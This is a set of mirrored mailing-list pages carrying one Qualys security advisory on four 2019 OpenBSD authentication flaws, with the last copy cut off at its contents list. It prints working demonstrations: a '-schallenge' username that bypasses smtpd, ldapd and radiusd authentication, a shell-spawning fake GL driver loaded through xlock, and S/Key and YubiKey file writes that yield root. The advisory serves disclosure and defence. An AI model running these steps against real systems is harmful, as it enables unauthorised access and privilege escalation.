=== Content from www.openwall.com_2167a6bf_20250121_002242.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20191204204020.GB7012@localhost.localdomain>
Date: Wed, 4 Dec 2019 20:49:22 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Authentication vulnerabilities in OpenBSD

Qualys Security Advisory

Authentication vulnerabilities in OpenBSD

==============================================================================
Contents
==============================================================================

1. CVE-2019-19521: Authentication bypass
   1.1. Analysis
   1.2. Case study: smtpd
   1.3. Case study: ldapd
   1.4. Case study: radiusd
   1.5. Case study: sshd
   1.6. Case study: su
2. CVE-2019-19520: Local privilege escalation via xlock
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
4. CVE-2019-19519: Local privilege escalation via su
5. Acknowledgments

==============================================================================
1. CVE-2019-19521: Authentication bypass
==============================================================================

We discovered an authentication-bypass vulnerability in OpenBSD's
authentication system: this vulnerability is remotely exploitable in
smtpd, ldapd, and radiusd, but its real-world impact should be studied
on a case-by-case basis. For example, sshd is not exploitable thanks to
its defense-in-depth mechanisms.

==============================================================================
1.1. Analysis
==============================================================================

From the manual page of login.conf:

------------------------------------------------------------------------------
     OpenBSD uses BSD Authentication, which is made up of a variety of
     authentication styles.  The authentication styles currently provided are:
     ...
     passwd     Request a password and check it against the password in the
                master.passwd file.  See login_passwd(8).
     ...
     skey       Send a challenge and request a response, checking it with
                S/Key (tm) authentication.  See login_skey(8).
     ...
     yubikey    Authenticate using a Yubico YubiKey token.  See
                login_yubikey(8).
     ...
     For any given style, the program /usr/libexec/auth/login_style is used to
     perform the authentication.  The synopsis of this program is:

     /usr/libexec/auth/login_style [-v name=value] [-s service] username class
------------------------------------------------------------------------------

This is the first piece of the puzzle: if an attacker specifies a
username of the form "-option", they can influence the behavior of the
authentication program in unexpected ways.

From the manual page of login_passwd:

------------------------------------------------------------------------------
     login_passwd [-s service] [-v wheel=yes|no] [-v lastchance=yes|no] user
                  [class]
     ...
     The service argument specifies which protocol to use with the invoking
     program.  The allowed protocols are login, challenge, and response.  (The
     challenge protocol is silently ignored but will report success as passwd-
     style authentication is not challenge-response based).
------------------------------------------------------------------------------

This is the second piece of the puzzle: if an attacker specifies the
username "-schallenge" (or "-schallenge:passwd" to force a passwd-style
authentication), then the authentication is automatically successful and
therefore bypassed.

==============================================================================
1.2. Case study: smtpd
==============================================================================

To demonstrate how smtpd's authentication can be bypassed, we follow the
instructions from the manual page of smtpd.conf:

------------------------------------------------------------------------------
     In this second example, the aim is to permit mail delivery and relaying
     only for users that can authenticate (using their normal login
     credentials).
           ...
           listen on egress tls pki mail.example.com auth
           ...
           match auth from any for any action "outbound"
------------------------------------------------------------------------------

and we restart smtpd. Then, with our remote-attacker hat on:

------------------------------------------------------------------------------
$ printf '\0-schallenge\0whatever' | openssl base64
AC1zY2hhbGxlbmdlAHdoYXRldmVy

$ openssl s_client -connect 192.168.56.121:25 -starttls smtp
...
EHLO client.example.com
...
AUTH PLAIN AC1zY2hhbGxlbmdlAHdoYXRldmVy
235 2.0.0 Authentication succeeded
------------------------------------------------------------------------------

==============================================================================
1.3. Case study: ldapd
==============================================================================

From the manual page of ldapd:

------------------------------------------------------------------------------
     ldapd can authenticate users via simple binds or SASL with the PLAIN
     mechanism.
     ...
     When using SASL binds, the authentication ID should be a valid username
     for BSD Authentication.

     For plain text passwords to be accepted, the connection must be
     considered secure, either by using an encrypted connection, or by using
     the secure keyword in the configuration file.
------------------------------------------------------------------------------

Over such a secure connection, a remote attacker can bypass ldapd's SASL
authentication:

------------------------------------------------------------------------------
$ ldapsearch -H ldap://192.168.56.121 -O none -U invaliduser -w whatever
SASL/PLAIN authentication started
ldap_sasl_interactive_bind_s: Invalid credentials (49)

$ ldapsearch -H ldap://192.168.56.121 -O none -U -schallenge -w whatever
SASL/PLAIN authentication started
SASL username: -schallenge
...
# numResponses: 1
------------------------------------------------------------------------------

==============================================================================
1.4. Case study: radiusd
==============================================================================

To show how radiusd's authentication can be bypassed, we adapt the
configuration example from the manual page of radiusd.conf:

------------------------------------------------------------------------------
           module load "bsdauth" "/usr/libexec/radiusd/radiusd_bsdauth"
           ...
           authenticate * {
                   authenticate-by "bsdauth"
           }
------------------------------------------------------------------------------

and we send the following (successful) authentication request:

------------------------------------------------------------------------------
$ radiusctl test 192.168.56.121 secret -schallenge password whatever
    ...
    Reply-Message             = "Authentication succeeded"
------------------------------------------------------------------------------

If we further modify radiusd's configuration to restrict access to the
members of the group "operator":

------------------------------------------------------------------------------
           module set "bsdauth"  "restrict-group" "operator"
------------------------------------------------------------------------------

and send our authentication request, then radiusd_bsdauth crashes
because of a NULL-pointer dereference (because getpwnam("-schallenge")
returns NULL):

------------------------------------------------------------------------------
 80 int
 81 main(int argc, char *argv[])
 82 {
...
192                                 pw = getpwnam(user);
...
197                                 if (gr->gr_gid == pw->pw_gid) {
------------------------------------------------------------------------------

==============================================================================
1.5. Case study: sshd
==============================================================================

Even if an attacker were able to bypass sshd's authentication with an
invalid user such as "-schallenge", sshd would eventually reject it:

------------------------------------------------------------------------------
 225 void
 226 monitor_child_preauth(struct ssh *ssh, struct monitor *pmonitor)
 227 {
 ...
 229         int authenticated = 0, partial = 0;
 ...
 249         while (!authenticated) {
 ...
 288         }
 289
 290         if (!authctxt->valid)
 291                 fatal("%s: authenticated invalid user", __func__);
------------------------------------------------------------------------------

Nevertheless, we can use sshd to remotely test whether an OpenBSD system
is vulnerable to CVE-2019-19521 or not:

------------------------------------------------------------------------------
$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive \
      -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 192.168.56.121
...
debug1: Next authentication method: keyboard-interactive
------------------------------------------------------------------------------

It is vulnerable if the connection hangs, because sshd waits for
login_passwd to send a challenge, while login_passwd waits for sshd to
send a response (because login_passwd interprets the username
"-sresponse" as an option).

==============================================================================
1.6. Case study: su
==============================================================================

A local attacker can bypass su's authentication for the invalid user
"-schallenge", but su eventually crashes because of a NULL-pointer
dereference (because getpwnam_r("-schallenge", ...) returns NULL):

------------------------------------------------------------------------------
$ su -L -- -schallenge
Segmentation fault
------------------------------------------------------------------------------

==============================================================================
2. CVE-2019-19520: Local privilege escalation via xlock
==============================================================================

On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is
set-group-ID "auth", not set-user-ID; the following check is therefore
incomplete and should use issetugid() instead:

------------------------------------------------------------------------------
101 _X_HIDDEN void *
102 driOpenDriver(const char *driverName)
103 {
...
113    if (geteuid() == getuid()) {
114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
115       libPaths = getenv("LIBGL_DRIVERS_PATH");
------------------------------------------------------------------------------

A local attacker can exploit this vulnerability and dlopen() their own
driver to obtain the privileges of the group "auth":

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[1] 2706

$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66

$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)
------------------------------------------------------------------------------

==============================================================================
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
==============================================================================

If the S/Key or YubiKey authentication type is enabled (they are both
installed by default but disabled), then a local attacker can exploit
the privileges of the group "auth" to obtain the full privileges of the
user "root" (because login_skey and login_yubikey do not verify that the
files in /etc/skey and /var/db/yubikey belong to the correct user, and
these directories are both writable by the group "auth").

(Note: to obtain the privileges of the group "auth", a local attacker
can first exploit CVE-2019-19520 in xlock.)

If S/Key is enabled (via skeyinit -E), a local attacker with "auth"
privileges can add an S/Key entry (a file in /etc/skey) for the user
"root" (if this file already exists, the attacker cannot simply remove
or rename it, because /etc/skey is sticky; a simple workaround exists,
and is left as an exercise for the interested reader):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root

$ chmod 0600 /etc/skey/root

$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password: EGG LARD GROW HOG DRAG LAIN

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

If YubiKey is enabled (via login.conf), a local attacker with "auth"
privileges can add a YubiKey entry (two files in /var/db/yubikey) for
the user "root" (if these files already exist, the attacker can simply
remove or rename them, because /var/db/yubikey is not sticky):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 32d32ddfb7d5 > /var/db/yubikey/root.uid

$ echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key

$ env -i TERM=vt220 su -l -a yubikey
Password: krkhgtuhdnjclrikikklulkldlutreul

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

==============================================================================
4. CVE-2019-19519: Local privilege escalation via su
==============================================================================

A local attacker can exploit su's -L option ("Loop until a correct
username and password combination is entered") to log in as themselves
but with another user's login class (with the exception of root's login
class if the attacker is not in the group "wheel"), because the class
variable is set once and never reset:

------------------------------------------------------------------------------
 60 int
 61 main(int argc, char **argv)
 62 {
...
174         for (;;) {
...
210                 if (!class && pwd && pwd->pw_class && pwd->pw_class[0] != '\0')
211                         class = strdup(pwd->pw_class);
------------------------------------------------------------------------------

In the following example, Jane (who is a member of the group "wheel")
logs in with root's login class ("daemon"), thereby increasing her
resource limits:

------------------------------------------------------------------------------
$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            512

$ su -l -L
login: root
Password:
Login incorrect
login: jane
Password:

$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            1310
------------------------------------------------------------------------------

In the following example, John (who is not a member of the group
"wheel") logs in with _pbuild's login class ("pbuild"), thereby
increasing his resource limits:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         786432
...
processes            256

$ su -l -L
login: _pbuild
Password:
Login incorrect
login: john
Password:

$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         33554432
...
processes            1024
------------------------------------------------------------------------------

==============================================================================
5. Acknowledgments
==============================================================================

We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published patches for these vulnerabilities less
than 40 hours after our initial contact. We also thank MITRE's CVE
Assignment Team.

[<https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png>]<<https://www.qualys.com/email-banner>>

This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from seclists.org_018c3326_20250121_002238.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# Authentication vulnerabilities in OpenBSD

---

*From*: Qualys Security Advisory <qsa () qualys com>

*Date*: Wed, 4 Dec 2019 21:21:04 +0000

---

```

Qualys Security Advisory

Authentication vulnerabilities in OpenBSD

==============================================================================
Contents
==============================================================================

1. CVE-2019-19521: Authentication bypass
   1.1. Analysis
   1.2. Case study: smtpd
   1.3. Case study: ldapd
   1.4. Case study: radiusd
   1.5. Case study: sshd
   1.6. Case study: su
2. CVE-2019-19520: Local privilege escalation via xlock
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
4. CVE-2019-19519: Local privilege escalation via su
5. Acknowledgments

==============================================================================
1. CVE-2019-19521: Authentication bypass
==============================================================================

We discovered an authentication-bypass vulnerability in OpenBSD's
authentication system: this vulnerability is remotely exploitable in
smtpd, ldapd, and radiusd, but its real-world impact should be studied
on a case-by-case basis. For example, sshd is not exploitable thanks to
its defense-in-depth mechanisms.

==============================================================================
1.1. Analysis
==============================================================================

From the manual page of login.conf:

------------------------------------------------------------------------------
     OpenBSD uses BSD Authentication, which is made up of a variety of
     authentication styles.  The authentication styles currently provided are:
     ...
     passwd     Request a password and check it against the password in the
                master.passwd file.  See login_passwd(8).
     ...
     skey       Send a challenge and request a response, checking it with
                S/Key (tm) authentication.  See login_skey(8).
     ...
     yubikey    Authenticate using a Yubico YubiKey token.  See
                login_yubikey(8).
     ...
     For any given style, the program /usr/libexec/auth/login_style is used to
     perform the authentication.  The synopsis of this program is:

     /usr/libexec/auth/login_style [-v name=value] [-s service] username class
------------------------------------------------------------------------------

This is the first piece of the puzzle: if an attacker specifies a
username of the form "-option", they can influence the behavior of the
authentication program in unexpected ways.

From the manual page of login_passwd:

------------------------------------------------------------------------------
     login_passwd [-s service] [-v wheel=yes|no] [-v lastchance=yes|no] user
                  [class]
     ...
     The service argument specifies which protocol to use with the invoking
     program.  The allowed protocols are login, challenge, and response.  (The
     challenge protocol is silently ignored but will report success as passwd-
     style authentication is not challenge-response based).
------------------------------------------------------------------------------

This is the second piece of the puzzle: if an attacker specifies the
username "-schallenge" (or "-schallenge:passwd" to force a passwd-style
authentication), then the authentication is automatically successful and
therefore bypassed.

==============================================================================
1.2. Case study: smtpd
==============================================================================

To demonstrate how smtpd's authentication can be bypassed, we follow the
instructions from the manual page of smtpd.conf:

------------------------------------------------------------------------------
     In this second example, the aim is to permit mail delivery and relaying
     only for users that can authenticate (using their normal login
     credentials).
           ...
           listen on egress tls pki mail.example.com auth
           ...
           match auth from any for any action "outbound"
------------------------------------------------------------------------------

and we restart smtpd. Then, with our remote-attacker hat on:

------------------------------------------------------------------------------
$ printf '\0-schallenge\0whatever' | openssl base64
AC1zY2hhbGxlbmdlAHdoYXRldmVy

$ openssl s_client -connect 192.168.56.121:25 -starttls smtp
...
EHLO client.example.com
...
AUTH PLAIN AC1zY2hhbGxlbmdlAHdoYXRldmVy
235 2.0.0 Authentication succeeded
------------------------------------------------------------------------------

==============================================================================
1.3. Case study: ldapd
==============================================================================

From the manual page of ldapd:

------------------------------------------------------------------------------
     ldapd can authenticate users via simple binds or SASL with the PLAIN
     mechanism.
     ...
     When using SASL binds, the authentication ID should be a valid username
     for BSD Authentication.

     For plain text passwords to be accepted, the connection must be
     considered secure, either by using an encrypted connection, or by using
     the secure keyword in the configuration file.
------------------------------------------------------------------------------

Over such a secure connection, a remote attacker can bypass ldapd's SASL
authentication:

------------------------------------------------------------------------------
$ ldapsearch -H ldap://192.168.56.121 -O none -U invaliduser -w whatever
SASL/PLAIN authentication started
ldap_sasl_interactive_bind_s: Invalid credentials (49)

$ ldapsearch -H ldap://192.168.56.121 -O none -U -schallenge -w whatever
SASL/PLAIN authentication started
SASL username: -schallenge
...
# numResponses: 1
------------------------------------------------------------------------------

==============================================================================
1.4. Case study: radiusd
==============================================================================

To show how radiusd's authentication can be bypassed, we adapt the
configuration example from the manual page of radiusd.conf:

------------------------------------------------------------------------------
           module load "bsdauth" "/usr/libexec/radiusd/radiusd_bsdauth"
           ...
           authenticate * {
                   authenticate-by "bsdauth"
           }
------------------------------------------------------------------------------

and we send the following (successful) authentication request:

------------------------------------------------------------------------------
$ radiusctl test 192.168.56.121 secret -schallenge password whatever
    ...
    Reply-Message             = "Authentication succeeded"
------------------------------------------------------------------------------

If we further modify radiusd's configuration to restrict access to the
members of the group "operator":

------------------------------------------------------------------------------
           module set "bsdauth"  "restrict-group" "operator"
------------------------------------------------------------------------------

and send our authentication request, then radiusd_bsdauth crashes
because of a NULL-pointer dereference (because getpwnam("-schallenge")
returns NULL):

------------------------------------------------------------------------------
 80 int
 81 main(int argc, char *argv[])
 82 {
...
192                                 pw = getpwnam(user);
...
197                                 if (gr->gr_gid == pw->pw_gid) {
------------------------------------------------------------------------------

==============================================================================
1.5. Case study: sshd
==============================================================================

Even if an attacker were able to bypass sshd's authentication with an
invalid user such as "-schallenge", sshd would eventually reject it:

------------------------------------------------------------------------------
 225 void
 226 monitor_child_preauth(struct ssh *ssh, struct monitor *pmonitor)
 227 {
 ...
 229         int authenticated = 0, partial = 0;
 ...
 249         while (!authenticated) {
 ...
 288         }
 289
 290         if (!authctxt->valid)
 291                 fatal("%s: authenticated invalid user", __func__);
------------------------------------------------------------------------------

Nevertheless, we can use sshd to remotely test whether an OpenBSD system
is vulnerable to CVE-2019-19521 or not:

------------------------------------------------------------------------------
$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive \
      -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 192.168.56.121
...
debug1: Next authentication method: keyboard-interactive
------------------------------------------------------------------------------

It is vulnerable if the connection hangs, because sshd waits for
login_passwd to send a challenge, while login_passwd waits for sshd to
send a response (because login_passwd interprets the username
"-sresponse" as an option).

==============================================================================
1.6. Case study: su
==============================================================================

A local attacker can bypass su's authentication for the invalid user
"-schallenge", but su eventually crashes because of a NULL-pointer
dereference (because getpwnam_r("-schallenge", ...) returns NULL):

------------------------------------------------------------------------------
$ su -L -- -schallenge
Segmentation fault
------------------------------------------------------------------------------

==============================================================================
2. CVE-2019-19520: Local privilege escalation via xlock
==============================================================================

On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is
set-group-ID "auth", not set-user-ID; the following check is therefore
incomplete and should use issetugid() instead:

------------------------------------------------------------------------------
101 _X_HIDDEN void *
102 driOpenDriver(const char *driverName)
103 {
...
113    if (geteuid() == getuid()) {
114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
115       libPaths = getenv("LIBGL_DRIVERS_PATH");
------------------------------------------------------------------------------

A local attacker can exploit this vulnerability and dlopen() their own
driver to obtain the privileges of the group "auth":

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[1] 2706

$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66

$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)
------------------------------------------------------------------------------

==============================================================================
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
==============================================================================

If the S/Key or YubiKey authentication type is enabled (they are both
installed by default but disabled), then a local attacker can exploit
the privileges of the group "auth" to obtain the full privileges of the
user "root" (because login_skey and login_yubikey do not verify that the
files in /etc/skey and /var/db/yubikey belong to the correct user, and
these directories are both writable by the group "auth").

(Note: to obtain the privileges of the group "auth", a local attacker
can first exploit CVE-2019-19520 in xlock.)

If S/Key is enabled (via skeyinit -E), a local attacker with "auth"
privileges can add an S/Key entry (a file in /etc/skey) for the user
"root" (if this file already exists, the attacker cannot simply remove
or rename it, because /etc/skey is sticky; a simple workaround exists,
and is left as an exercise for the interested reader):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root

$ chmod 0600 /etc/skey/root

$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password: EGG LARD GROW HOG DRAG LAIN

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

If YubiKey is enabled (via login.conf), a local attacker with "auth"
privileges can add a YubiKey entry (two files in /var/db/yubikey) for
the user "root" (if these files already exist, the attacker can simply
remove or rename them, because /var/db/yubikey is not sticky):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 32d32ddfb7d5 > /var/db/yubikey/root.uid

$ echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key

$ env -i TERM=vt220 su -l -a yubikey
Password: krkhgtuhdnjclrikikklulkldlutreul

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

==============================================================================
4. CVE-2019-19519: Local privilege escalation via su
==============================================================================

A local attacker can exploit su's -L option ("Loop until a correct
username and password combination is entered") to log in as themselves
but with another user's login class (with the exception of root's login
class if the attacker is not in the group "wheel"), because the class
variable is set once and never reset:

------------------------------------------------------------------------------
 60 int
 61 main(int argc, char **argv)
 62 {
...
174         for (;;) {
...
210                 if (!class && pwd && pwd->pw_class && pwd->pw_class[0] != '\0')
211                         class = strdup(pwd->pw_class);
------------------------------------------------------------------------------

In the following example, Jane (who is a member of the group "wheel")
logs in with root's login class ("daemon"), thereby increasing her
resource limits:

------------------------------------------------------------------------------
$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            512

$ su -l -L
login: root
Password:
Login incorrect
login: jane
Password:

$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            1310
------------------------------------------------------------------------------

In the following example, John (who is not a member of the group
"wheel") logs in with _pbuild's login class ("pbuild"), thereby
increasing his resource limits:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         786432
...
processes            256

$ su -l -L
login: _pbuild
Password:
Login incorrect
login: john
Password:

$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         33554432
...
processes            1024
------------------------------------------------------------------------------

==============================================================================
5. Acknowledgments
==============================================================================

We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published patches for these vulnerabilities less
than 40 hours after our initial contact. We also thank MITRE's CVE
Assignment Team.

[<https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png>]<<https://www.qualys.com/email-banner>>

This message may contain confidential and privileged information. If it has been sent to you in error, please reply to
advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read,
copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that
all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service
providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate
unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **Authentication vulnerabilities in OpenBSD** *Qualys Security Advisory (Dec 06)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_5470b1c9_20250121_002236.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from seclists.org_a54ce03a_20250121_002240.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# Authentication vulnerabilities in OpenBSD

---

*From*: Qualys Security Advisory <qsa () qualys com>

*Date*: Wed, 4 Dec 2019 21:12:13 +0000

---

```

Qualys Security Advisory

Authentication vulnerabilities in OpenBSD

==============================================================================
Contents
==============================================================================

1. CVE-2019-19521: Authentication bypass
   1.1. Analysis
   1.2. Case study: smtpd
